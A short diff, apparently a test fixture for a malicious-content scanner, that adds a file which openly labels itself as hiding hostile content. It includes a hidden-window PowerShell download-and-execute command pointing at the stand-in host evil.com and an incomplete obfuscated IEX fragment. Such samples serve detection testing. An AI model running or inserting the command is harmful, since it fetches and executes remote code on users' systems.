@@ -1,0 +1,8 @@
+This file starts with normal content.
+Regular text that looks benign at first.
+
+But then it contains:
+powershell -w hidden -nop -c "IEX ((new-object net.webclient).downloadstring('http://evil.com/malware'))"
+
+And also some obfuscated PowerShell:
+$a='Invoke-Expression';$b='DownloadString';IEX
